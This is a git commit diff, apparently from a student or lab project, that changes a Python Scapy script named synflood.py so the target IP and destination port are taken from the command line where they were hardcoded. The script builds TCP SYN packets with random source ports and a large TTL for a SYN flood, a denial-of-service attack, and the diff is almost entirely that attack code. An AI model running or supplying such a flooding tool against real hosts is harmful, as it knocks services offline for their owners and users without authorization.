518750e3e492e52a98ca46bbb7fa5ba4cc05282c
Giorgio <gp922@nyu.edu>
2016-02-16 22:44:14 -0500

    added command line input for synflood

--- synflood.py
+++ synflood.py
@@ -1,15 +1,22 @@
 import sys
 from scapy.all import *
 
-target = "10.0.3.15"
-dest_port = 139
+if len(sys.argv) < 2:
+  print "usage: sudo ./python synflood.py ip_address [dest port]"
+  exit()
+target = sys.argv[1]
+if len(sys.argv) == 3:
+  dest_port = sys.argv[2]
+else:
+  dest_port = 139
+
 flood_rate = 0.2
 
 # set large TTL
 ip_layer = IP(dst = target, ttl = 200)
 
 # build SYN packet with random source port
-tcp_layer = TCP(sport = RandShort(), dport = 139, flags = "S")
+tcp_layer = TCP(sport = RandShort(), dport = dest_port, flags = "S")
 
 packet = ip_layer/tcp_layer
 
